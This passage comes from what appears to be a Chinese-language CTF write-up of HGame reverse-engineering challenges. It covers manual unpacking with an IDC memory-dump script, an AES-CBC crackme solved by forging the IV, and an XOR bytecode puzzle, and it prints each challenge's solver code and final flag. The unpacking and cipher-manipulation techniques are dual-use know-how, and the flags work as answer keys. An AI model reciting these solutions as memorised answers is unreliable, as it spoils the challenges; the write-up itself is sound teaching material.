class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_LOAD              1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_DYNAMIC           2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> ImageBase,StartImg,EndImg;</span><br><span class="line">  <span class="keyword">auto</span> e_phoff;</span><br><span class="line">  <span class="keyword">auto</span> e_phnum,p_offset;</span><br><span class="line">  <span class="keyword">auto</span> i,dumpfile;</span><br><span class="line">  ImageBase=<span class="number">0x400000</span>;</span><br><span class="line">  StartImg=<span class="number">0x400000</span>;</span><br><span class="line">  EndImg=<span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">Dword</span>(ImageBase)==<span class="number">0x7f454c46</span> || <span class="built_in">Dword</span>(ImageBase)==<span class="number">0x464c457f</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(dumpfile=<span class="built_in">fopen</span>(<span class="string">&quot;D:\\dumpfile&quot;</span>,<span class="string">&quot;wb&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      e_phoff=ImageBase+<span class="built_in">Qword</span>(ImageBase+<span class="number">0x20</span>);</span><br><span class="line">      <span class="built_in">Message</span>(<span class="string">&quot;e_phoff = 0x%x\n&quot;</span>, e_phoff);</span><br><span class="line">      e_phnum=<span class="built_in">Word</span>(ImageBase+<span class="number">0x38</span>);</span><br><span class="line">      <span class="built_in">Message</span>(<span class="string">&quot;e_phnum = 0x%x\n&quot;</span>, e_phnum);</span><br><span class="line">      <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;e_phnum;i++)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="built_in">Dword</span>(e_phoff)==PT_LOAD || <span class="built_in">Dword</span>(e_phoff)==PT_DYNAMIC)</span><br><span class="line">         &#123; </span><br><span class="line">			p_offset=<span class="built_in">Qword</span>(e_phoff+<span class="number">0x8</span>);</span><br><span class="line">            StartImg=<span class="built_in">Qword</span>(e_phoff+<span class="number">0x10</span>);</span><br><span class="line">            EndImg=StartImg+<span class="built_in">Qword</span>(e_phoff+<span class="number">0x28</span>);</span><br><span class="line">            <span class="built_in">Message</span>(<span class="string">&quot;start = 0x%x, end = 0x%x, offset = 0x%x\n&quot;</span>, StartImg, EndImg, p_offset);</span><br><span class="line">            <span class="built_in">dump</span>(dumpfile,StartImg,EndImg,p_offset);</span><br><span class="line">            <span class="built_in">Message</span>(<span class="string">&quot;dump segment %d ok.\n&quot;</span>,i);</span><br><span class="line">         &#125;    </span><br><span class="line">         e_phoff=e_phoff+<span class="number">0x38</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fseek</span>(dumpfile,<span class="number">0x3c</span>,<span class="number">0</span>);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fseek</span>(dumpfile,<span class="number">0x28</span>,<span class="number">0</span>);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">	  </span><br><span class="line">      <span class="built_in">fclose</span>(dumpfile);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="built_in">Message</span>(<span class="string">&quot;dump err.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">dump</span><span class="params">(dumpfile,startimg,endimg,offset)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> i;</span><br><span class="line">  <span class="keyword">auto</span> size;</span><br><span class="line">  size=endimg-startimg;</span><br><span class="line">  <span class="built_in">fseek</span>(dumpfile,offset,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i=<span class="number">0</span>; i &lt; size; i=i+<span class="number">1</span> ) </span><br><span class="line">  &#123;</span><br><span class="line">	<span class="built_in">fputc</span>(<span class="built_in">Byte</span>(startimg+i),dumpfile);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>尝试在虚拟机里面运行，发现可以运行，代表脱壳成功，反编译，通过提示语找到程序处理输入的部分</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>((__int64)<span class="string">&quot;%42s&quot;</span>, v7);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">41</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i + v7[i] != (<span class="keyword">unsigned</span> __int8)byte_6CA0A0[i] )</span><br><span class="line">      v5 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="string">&quot;Wrong input&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wrong input&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="string">&quot;Congratulations! Flag is your input&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Congratulations! Flag is your input&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>本题主要考验手动脱壳的技巧，对于加密部分并没有设置太多的难度，直接导出6CA0A0处的数组然后进行逆变换就得到了flag</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="number">0x68</span>, <span class="number">0x68</span>, <span class="number">0x63</span>, <span class="number">0x70</span>, <span class="number">0x69</span>, <span class="number">0x80</span>, <span class="number">0x5B</span>, <span class="number">0x75</span>, <span class="number">0x78</span>, <span class="number">0x49</span>,</span><br><span class="line">                    <span class="number">0x6D</span>, <span class="number">0x76</span>, <span class="number">0x75</span>, <span class="number">0x7B</span>, <span class="number">0x75</span>, <span class="number">0x6E</span>, <span class="number">0x41</span>, <span class="number">0x84</span>, <span class="number">0x71</span>, <span class="number">0x65</span>,</span><br><span class="line">                    <span class="number">0x44</span>, <span class="number">0x82</span>, <span class="number">0x4A</span>, <span class="number">0x85</span>, <span class="number">0x8C</span>, <span class="number">0x82</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>, <span class="number">0x82</span>, <span class="number">0x4D</span>,</span><br><span class="line">                    <span class="number">0x90</span>, <span class="number">0x7E</span>, <span class="number">0x92</span>, <span class="number">0x54</span>, <span class="number">0x98</span>, <span class="number">0x88</span>, <span class="number">0x96</span>, <span class="number">0x98</span>, <span class="number">0x57</span>, <span class="number">0x95</span>,</span><br><span class="line">                    <span class="number">0x8F</span>, <span class="number">0xA6</span></span><br><span class="line">            &#125;;</span><br><span class="line">    string flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">42</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            flag+=ida_chars[i]-i;</span><br><span class="line">        &#125;</span><br><span class="line">    cout&lt;&lt;flag&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后输出flag</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hgame</span>&#123;Unp@cking_<span class="number">1</span>s_R<span class="number">0</span>m<span class="number">4</span>ntic_f<span class="number">0</span>r_r<span class="number">3</span>vers<span class="number">1</span>ng&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Classic-CrackMe"><a href="#Classic-CrackMe" class="headerlink" title="Classic_CrackMe"></a>Classic_CrackMe</h4><p>PEiD查看一下，没壳，编写语言是Microsoft Visual C# / Basic .NET，C#逆向没有难度，</p>
<p>dnSpy打开就和源码几乎没什么区别，这题显然难度不在这，反编译之后找到按键click事件，关键代码就在这里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">private void button1_Click(object sender, EventArgs e)</span><br><span class="line">		&#123;</span><br><span class="line">			if (this.status == 1)</span><br><span class="line">			&#123;</span><br><span class="line">				MessageBox.Show(&quot;你已经激活成功啦，快去提交flag吧~~~&quot;);</span><br><span class="line">				return;</span><br><span class="line">			&#125;</span><br><span class="line">			string text = this.textBox1.Text;</span><br><span class="line">			if (text.Length != 46 || text.IndexOf(&quot;hgame&#123;&quot;) != 0 || text.IndexOf(&quot;&#125;&quot;) != 45)</span><br><span class="line">			&#123;</span><br><span class="line">				MessageBox.Show(&quot;Illegal format&quot;);</span><br><span class="line">				return;</span><br><span class="line">			&#125;</span><br><span class="line">			string base64iv = text.Substring(6, 24);</span><br><span class="line">			string str = text.Substring(30, 15);</span><br><span class="line">			try</span><br><span class="line">			&#123;</span><br><span class="line">				Aes aes = new Aes(&quot;SGc0bTNfMm8yMF9XZWVLMg==&quot;, base64iv);</span><br><span class="line">				Aes aes2 = new Aes(&quot;SGc0bTNfMm8yMF9XZWVLMg==&quot;, &quot;MFB1T2g5SWxYMDU0SWN0cw==&quot;);</span><br><span class="line">				string text2 = aes.DecryptFromBase64String(&quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;);</span><br><span class="line">				if (text2.Equals(&quot;Same_ciphertext_&quot;))</span><br><span class="line">				&#123;</span><br><span class="line">					byte[] array = new byte[16];</span><br><span class="line">					Array.Copy(aes2.EncryptToByte(text2 + str), 16, array, 0, 16);</span><br><span class="line">					if (Convert.ToBase64String(array).Equals(&quot;dJntSWSPWbWocAq4yjBP5Q==&quot;))</span><br><span class="line">					&#123;</span><br><span class="line">						MessageBox.Show(&quot;注册成功！&quot;);</span><br><span class="line">						this.Text = &quot;已激活，欢迎使用！&quot;;</span><br><span class="line">						this.status = 1;</span><br><span class="line">					&#125;</span><br><span class="line">					else</span><br><span class="line">					&#123;</span><br><span class="line">						MessageBox.Show(&quot;注册失败！\nhint: &quot; + aes2.DecryptFromBase64String(&quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;));</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				else</span><br><span class="line">				&#123;</span><br><span class="line">					MessageBox.Show(&quot;注册失败！\nhint: &quot; + aes2.DecryptFromBase64String(&quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;));</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			catch</span><br><span class="line">			&#123;</span><br><span class="line">				MessageBox.Show(&quot;注册失败！&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>发现最终考察的还是aes的cbc模式，我们输入的flag被掐头去尾分成了两部分，前一部分作为第一个aes实例的base64iv，第二段作为第二个实例的明文后半段，具体原理可以百度。</p>
<p>对于第一部分，每个key解密一组密文的结果是一样的只是iv不同，明文不同，所以只需要另找一组iv，求出这个解密之后的结果（解密出来的明文 xor FakeIV），然后在异或我们已知的明文就可以得到结果</p>
<p>对于第二部分，根据原理我们知道，后面的部分并不影响前面的加密结果，所以直接把一致的明文加密，然后再和已知的密文合并在一起，得到整体的一个密文，然后解密出来的后半部分就是我们需要的字符串。</p>
<p>不过这里需要注意几点，注意输入输出的数据类型，并且对于第二部分的处理要记得填充字符，因为第二部分只有15位，要填充到16位才能运算，一开始这里没注意，花了好长时间结果还是错的。</p>
<p>直接python解决：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 传入的key和iv都是bytes类型，加密输出的是经过base64编码之后的密文，解密传入的也是base64编码过后的密文</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AesCrypter</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key, iv</span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.iv = iv</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pkcs7padding</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        bs = AES.block_size  <span class="comment"># 16</span></span><br><span class="line"></span><br><span class="line">        length = <span class="built_in">len</span>(text)</span><br><span class="line">        bytes_length = <span class="built_in">len</span>(<span class="built_in">bytes</span>(text, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        padding_size = length <span class="keyword">if</span> (bytes_length == length) <span class="keyword">else</span> bytes_length</span><br><span class="line">        padding = bs - padding_size % bs</span><br><span class="line">        padding_text = <span class="built_in">chr</span>(padding) * padding</span><br><span class="line">        <span class="keyword">return</span> text + padding_text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pkcs7unpadding</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        length = <span class="built_in">len</span>(text)</span><br><span class="line">        unpadding = <span class="built_in">ord</span>(text[length - <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> text[<span class="number">0</span>:length - unpadding]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, content</span>):</span></span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        content_padding = self.pkcs7padding(content)</span><br><span class="line">        aes_encode_bytes = cipher.encrypt(<span class="built_in">bytes</span>(content_padding, encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        result = base64.b64encode(aes_encode_bytes).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, content</span>):</span></span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)</span><br><span class="line">        <span class="comment"># base64解码</span></span><br><span class="line">        aes_encode_bytes = base64.b64decode(content)</span><br><span class="line">        <span class="comment"># 解密</span></span><br><span class="line">        aes_decode_bytes = cipher.decrypt(aes_encode_bytes)</span><br><span class="line">        <span class="comment"># 重新编码</span></span><br><span class="line">        result = aes_decode_bytes.decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="comment"># 去除填充内容</span></span><br><span class="line">        result = self.pkcs7unpadding(result)</span><br><span class="line">        <span class="keyword">if</span> result == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = base64.b64decode(<span class="string">&quot;SGc0bTNfMm8yMF9XZWVLMg==&quot;</span>)</span><br><span class="line">fakeIV = base64.b64decode(<span class="string">&#x27;MFB1T2g5SWxYMDU0SWN0cw==&#x27;</span>)</span><br><span class="line">plainText = <span class="string">&quot;Same_ciphertext_&quot;</span></span><br><span class="line">ciperText = <span class="string">&quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;</span></span><br><span class="line"></span><br><span class="line">aesCipher = AesCrypter(key, fakeIV)</span><br><span class="line"></span><br><span class="line">fakePlainText = aesCipher.decrypt(ciperText)</span><br><span class="line"><span class="comment"># print(fakePlainText)</span></span><br><span class="line">IV = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    IV += <span class="built_in">chr</span>(<span class="built_in">ord</span>(fakePlainText[i]) ^ fakeIV[i] ^ <span class="built_in">ord</span>(plainText[i]))</span><br><span class="line"><span class="comment"># print(&quot;IV : &quot; + IV)</span></span><br><span class="line"><span class="comment"># /TyXYzPnY;$)\we_</span></span><br><span class="line">IV = base64.b64encode(IV.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cipherText2 = aesCipher.encrypt(plainText)</span><br><span class="line">cipherText2 = base64.b64decode(cipherText2).<span class="built_in">hex</span>()[:<span class="number">32</span>]</span><br><span class="line">cipherText3 = <span class="string">&#x27;dJntSWSPWbWocAq4yjBP5Q==&#x27;</span></span><br><span class="line">cipherText3 = base64.b64decode(cipherText3).<span class="built_in">hex</span>()[:<span class="number">32</span>]</span><br><span class="line"><span class="comment"># print(cipherText2 + cipherText3)</span></span><br><span class="line">cipherText4 = <span class="built_in">bytes</span>.fromhex(cipherText2 + cipherText3)</span><br><span class="line">cipherText4 = base64.b64encode(cipherText4)</span><br><span class="line"><span class="comment"># print(cipherText4)</span></span><br><span class="line">plainText3 = aesCipher.decrypt(cipherText4)</span><br><span class="line"><span class="comment"># print(plainText3)</span></span><br><span class="line"><span class="comment"># Same_ciphertext_DiFfer3Nt_w0r1d</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag += <span class="string">&#x27;hgame&#123;&#x27;</span> + IV + plainText3[<span class="number">16</span>:] + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># hgame&#123;L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d&#125;</span></span><br></pre></td></tr></table></figure>

<p>最终的flag</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hgame</span>&#123;L<span class="number">1</span>R<span class="number">5</span>WFl<span class="number">6</span>UG<span class="number">5</span>ZOyQpXHdlXw==DiFfer<span class="number">3</span>Nt_w<span class="number">0</span>r<span class="number">1</span>d&#125;</span><br></pre></td></tr></table></figure>

<h4 id="babyPy"><a href="#babyPy" class="headerlink" title="babyPy"></a>babyPy</h4><p>这题比较简单，把log和dis指令表对照一下就能还原出来函数的原型来</p>
<p>dis指令表见<a target="_blank" rel="noopener" href="https://docs.python.org/3/library/dis.html#python-bytecode-instructions">https://docs.python.org/3/library/dis.html#python-bytecode-instructions</a></p>
<p>还原出来的函数原型（想打死命名的人）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">OOo</span>):</span></span><br><span class="line"> O0O = OOo[::-<span class="number">1</span>]</span><br><span class="line"> O0o = <span class="built_in">list</span>(O0O)</span><br><span class="line"> <span class="keyword">for</span> O0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(O0o)):</span><br><span class="line"> 	Oo = O0o[O0-<span class="number">1</span>] ^ O0o[O0]</span><br><span class="line"> 	O0o[O0] = Oo</span><br><span class="line"> O = <span class="built_in">bytes</span>(O0o)</span><br><span class="line"> <span class="keyword">return</span> O.<span class="built_in">hex</span>()</span><br></pre></td></tr></table></figure>

<p>所以只需要反过来异或一遍就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22&#x27;</span>)</span><br><span class="line">c = <span class="built_in">list</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c) - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    c[i] ^= c[i - <span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(c[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<p>输出flag</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hgame</span>&#123;sT<span class="number">4</span>cK_<span class="number">1</span>$_sO_e@Sy~~&#125;</span><br></pre></td></tr></table></figure>


  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1"><span class="toc-number">1.</span> <span class="toc-text">Week1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A5-%E5%A4%B4-%E9%9C%B8-%E7%8E%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">接 头 霸 王</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RE"><span class="toc-number">1.2.</span> <span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#maze"><span class="toc-number">1.2.1.</span> <span class="toc-text">maze</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bitwise-operation2"><span class="toc-number">1.2.2.</span> <span class="toc-text">bitwise_operation2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#advance"><span class="toc-number">1.2.3.</span> <span class="toc-text">advance</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cpp"><span class="toc-number">1.2.4.</span> <span class="toc-text">cpp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN"><span class="toc-number">1.3.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Hard-AAAAA"><span class="toc-number">1.3.1.</span> <span class="toc-text">Hard_AAAAA</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-number">1.4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#InfantRSA"><span class="toc-number">1.4.1.</span> <span class="toc-text">InfantRSA</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc"><span class="toc-number">1.5.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AC%A2%E8%BF%8E%E5%8F%82%E5%8A%A0HGame%EF%BC%81"><span class="toc-number">1.5.1.</span> <span class="toc-text">欢迎参加HGame！</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 